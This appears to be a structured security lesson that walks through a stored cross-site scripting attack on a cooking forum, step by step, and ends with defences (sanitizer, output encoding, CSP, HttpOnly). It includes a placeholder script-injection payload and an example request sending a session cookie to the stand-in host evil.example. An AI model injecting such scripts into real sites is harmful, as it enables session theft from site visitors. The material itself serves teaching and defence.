# Stored XSS

`lesson` C2 · `section` C · `wave` 1 · `format` 1

## Passport

- `cwe` 79
- `owasp` A03:2021
- `severity` high
- `impact` Someone else's script runs for everyone who opens the page: stolen sessions, actions in the readers' names
- `defence` HTML sanitizer and output encoding
- `class` Injection into a web page

## Sources

- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Top 10:2021, A03 Injection](https://owasp.org/Top10/2021/A03_2021-Injection/)
- [MITRE CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [MDN: Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
- [MDN: Set-Cookie, the HttpOnly attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)
- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)

## Participants

- `attacker` **Attacker** — 203.0.113.66 · `term:attacker`
- `browser` **Reader** — browser, 192.0.2.24 · `icon:browser` · `term:victim`
- `server` **Forum server** — forum.example · `term:web-server`
- `db` **Database** — comments · `term:database`

## Zones

- `internet` Internet: `attacker`
- `home` Home: `browser`
- `site` Site forum.example: `server`, `db` · `term:trust-boundary`

## Steps

### `post` A comment with a surprise

`attacker → server` · `attack`
Message: new comment · Result: accepted

```http
POST /recipes/42/comments
Host: forum.example

text=Great <b>recipe</b>! ⟦<script>steal()</script>⟧
```

#### Simple

On a cooking forum, the attacker leaves an ordinary comment under a recipe: “Great recipe!”. But
at the end of the comment he adds **a piece of a program**.

#### Step by step

The forum lets people format comments: words can be highlighted with `<b>` and `<i>` tags. The
attacker submits the comment form with a `<script>` tag after the text that calls his own
function `steal()`.

#### Deeper

`steal()` is a made-up name: in real life this spot would hold code that does something in the
reader's browser. The main difference from reflected XSS: the attacker does not have to talk
every victim into clicking a link. He leaves the comment once, and from then on the site hands
the script out to everyone by itself.

### `save` The comment is saved as is

`server → db` · `attack`
Message: INSERT comment · Result: saved together with the script

```sql
INSERT INTO comments (recipe, text) VALUES (42, ?)
```

#### Simple

The server puts the comment into the database. It does not touch characters like `<` and `>`:
to the database they are just letters. The script is now **stored** on the site, hence the name.

#### Step by step

The database query is parameterized, so there is no SQL injection: the string goes into the table
whole, `<script>` tag included. It is dangerous not to the database but to the page it will later
be put into.

#### Deeper

MITRE calls this kind stored (type 2): the server saves dangerous data in a database, a message
forum or a log, and later puts it into a page. The store can be anything: a profile, a review, a
file name, a log entry that an administrator opens later.

### `open` A reader opens the recipe

`browser → server` · `legit`
Message: GET /recipes/42 · Result: request accepted

```http
GET /recipes/42
Host: forum.example
Cookie: session=7f3a9c
```

#### Simple

A day later, someone else looks for a recipe and opens this page. They clicked nothing suspicious
and agreed to nothing: they just came to read.

#### Step by step

The reader's browser asks for the recipe page. The reader is logged in to the forum, so the
browser attaches the **session cookie** to the request by itself.

#### Deeper

The reader can be anyone, including a forum moderator or administrator. They have more rights,
which is why attackers pick places that many people read, or that important people read.

### `render` The server puts the comment into the page

`server → browser` · `attack` · `without-defence`
Message: recipe page · Result: the script became part of the page

```html
<div class="comment">Great <b>recipe</b>! ⟦<script>steal()</script>⟧</div>
```

#### Simple

The server takes the comment out of the database and **puts it into the page as is**. The browser
sees the `<script>` tag and runs it as if it were the forum's own script.

#### Step by step

The page template glues the markup and the comment text together without any processing. The
finished page goes to the browser, which parses it and runs the embedded script.

#### Deeper

The script runs in the forum.example origin, so it can do anything the forum itself can do in
that tab: read the page, send requests in the reader's name, show a fake login window. The
weakness is the same, CWE-79, but the harmful text came from the database, not from the request.

### `steal` The cookie goes to the attacker

`browser → attacker` · `attack` · `without-defence`
Message: session cookie · Result: stolen

```http
GET /c?d=⟦session=7f3a9c⟧
Host: evil.example
```

#### Simple

The script sends the attacker the reader's **pass** to the forum. With it the attacker can log in
as the reader without a password. And this happens to everyone who opens the recipe.

#### Step by step

The script reads `document.cookie` and makes a request to the attacker's server with the value
written into the address. The attacker's server records it.

#### Deeper

The `HttpOnly` attribute on the session cookie forbids page scripts from reading it, and this
step would fail. But the script could still send requests in the reader's name right from their
tab. `HttpOnly` reduces the damage; it does not fix the XSS itself.

### `sanitize` A sanitizer cleans out the script

`server → server` · `attack` · `with-defence` · `stopped`
Message: comment from the database · Result: script removed, the attack failed

```text
in:  Great <b>recipe</b>! ⟦<script>steal()</script>⟧
out: Great <b>recipe</b>!
```

#### Simple

Before putting the comment into the page, the server runs it through a **sanitizer**: a filter
that keeps safe formatting and throws away everything dangerous. The script disappears, the bold
text stays. This is where the attack stops.

#### Step by step

The sanitizer parses the comment as HTML and checks every tag and attribute against an allow list.
`<b>` and `<i>` are on the list; `<script>` and event handler attributes such as `onerror` are
not, so it removes them.

#### Deeper

Plain encoding would break the formatting here: readers would see `<b>` as letters. For such cases
OWASP recommends a sanitizer and names DOMPurify. A home-made filter that “removes the word
script” is unreliable: dangerous HTML can be written in dozens of ways. And the string must not be
changed after sanitizing, or the cleaning loses its point.

### `page` A page without the stranger's script

`server → browser` · `safe` · `with-defence`
Message: recipe page · Result: comment shown, no script

```html
<div class="comment">Great <b>recipe</b>!</div>
```

#### Simple

The reader sees an ordinary comment with one word in bold. Nothing runs, and their pass stays
with them.

#### Step by step

The browser gets a page where only the allowed markup is left of the comment, and simply shows it.

#### Deeper

If the forum does not need formatting, it is simpler and more reliable to encode the whole
comment as text. A Content Security Policy whose `script-src` rule has no `'unsafe-inline'` works
as a second layer: if the cleaning is forgotten somewhere, the browser still will not run an
inline script.

## How to defend

- **Output encoding.** If users do not need HTML, everything they send goes into the page only as
  text, encoded for its place: page text, attribute, JavaScript, URL.
- **A sanitizer when HTML is needed.** For formatted comments and editors, use a proven HTML
  sanitizer with an allow list of tags (OWASP names DOMPurify), not a home-made filter. Do not
  change the string after cleaning.
- **Remember every store.** Dangerous data can sit in profiles, reviews, file names, logs. Encode
  on every output, including the admin panel.
- **Content Security Policy.** A `script-src` rule without `'unsafe-inline'` stops an inline
  script from running if a defence was forgotten somewhere. It is a second layer, not a
  replacement.
- **HttpOnly for the session cookie.** A script cannot read the cookie and send it to the
  attacker. The damage is smaller, but XSS is still XSS.
